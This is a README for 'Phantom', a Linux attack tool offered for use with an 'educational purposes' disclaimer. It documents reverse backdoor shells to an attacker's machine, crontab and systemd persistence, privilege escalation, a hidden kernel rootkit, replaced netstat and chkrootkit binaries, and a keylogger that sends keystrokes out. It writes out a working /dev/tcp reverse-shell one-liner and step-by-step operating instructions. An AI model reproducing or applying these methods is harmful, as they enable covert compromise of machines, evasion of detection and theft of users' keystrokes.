# Overview

Phantom is a tool which creates backdoor shells from a target machine to an attacker's and hides their
pid, persisting through reboots. It also hides the files needed to perform the above and replaces netstat and chkrootkit.
If needed it attempts privilege escalation. Finally, it installs a keylogger. It only works on Linux machines.

**Phantom was created for educational purposes. Stay away from illegal activities.**

Phantom uses ncat on the attacker's machine to listen for incoming connections from the target's machine. At first it
opens an ncat connection to a port (port1) and when the target's machine connects to this port it delivers the payload. The payload
opens a new backdoor shell every five minutes to the attacker's machine, but to a different port than the first one (port2). The reason for this is that this way you have more control of what to do with the backdoor shell, otherwise the same payload gets executed each time the target connects to your machine. It also creates a python3 server listening to a third port that is needed to transfer the files needed by the payload. If privilege escalation is attempted, it opens another ncat process. Lastly, it installs
a keylogger to the target's machine which sends keystrokes to a specified port (portk).

## Usage

```
phantom-init [ip=][port1=][port2=][portk=]
```

* ip: the attacker's ip (e.g. ip=127.0.0.1)
* port1: the port that listens for connections to deliver the payload (e.g. port1=8888)
* port2: the port that listens for the backdoor shells after delivering the payload
* portk: the port that listens for keystrokes

You have to somehow make the target connect to port1, i.e. bash -c 'bash &>/dev/tcp/ip/port1 <&1 &'
(ip and port1 are the ones specified above.)

## Files

* phantom-init: Creates the python3 server and an ncat listening process to a predefined ip and port and redirects input to the payload file.

* payload: This is the file that gets executed when the target connects to the listening ncat port1. It does the following:
  * If the user connecting is not root it overwrites the user's crontab entry with code which periodically attempts to create a
  backdoor shell to port2 and then attempts privilege escalation. If it succeeds it moves to the next step.
  * If the user connecting is root and systemd is used, it creates a systemd service which executes a script, continuously trying to
  create a backdoor bash shell to the attacker's machine (port2). It also creates a systemd service which executes a script,
  hiding the pids of the backdoor shells and systemd services (ps aux cannot find them this way). Finally, it creates a systemd service which executes, a script
  which send keystrokes to the attacker's machien (portk). If systemd is not used it does the same but with a crontab file and python shells. It then creates and inserts a rootkit module named usb-bus which hides its files, the ones of the scripts that the systemd services/crontab use and the systemd services/crontab themselves. It is also persistent through reboots because the script which hides the pids inserts it when it loads at boot time. Then, it replaces netstat with a version that hides the remote connections to the specified ip and chkrootkit, so it doesn't show that netstat is replaced and there is a LKM rootkit present in the system.

* phantom-firewall: This file uses nftables. Use it only with sudo. It makes a backup of the nft ruleset in /etc/nftables.conf.bak and then
modifies the nft ruleset so that it doesn't allow more than one connection from a target ip. This is good because the target machine will
continuously open new bash shells, increasing the footprint of Phantom's actions and putting increasing and uneeded load on the target system. It can also undo changes made to the nft ruleset by using the argument -r | -R .

## Order of execution

* Before delivering the payload:
  1.  Execute phantom-init and wait for the target to connect to your machine.

* After delivering the payload:
  1.  Execute phantom-firewall as root, so it can modify the firewall rules.
  2.  Create a ncat process listening at the 2nd-port. (use the -k flag to accept multiple connections)
  3.  Create a ncat process listening at portk. (use the -k flag to accept multiple connections)

## Order of closing

1.  Close the ncat listening processes so all the connections get closed.
2.  Close phantom-firewall.
3.  Execute this command: sudo phantom-firewall -r | -R. This undoes any changes to the nft ruleset made by phantom-firewall.
    This is needed if you want the target to be able to connect to you again, otherwise a nftables rule is gonna
    block him.

### Contact Information

Konstantinos Sarantopoulos  
konsaranto@protonmail.com
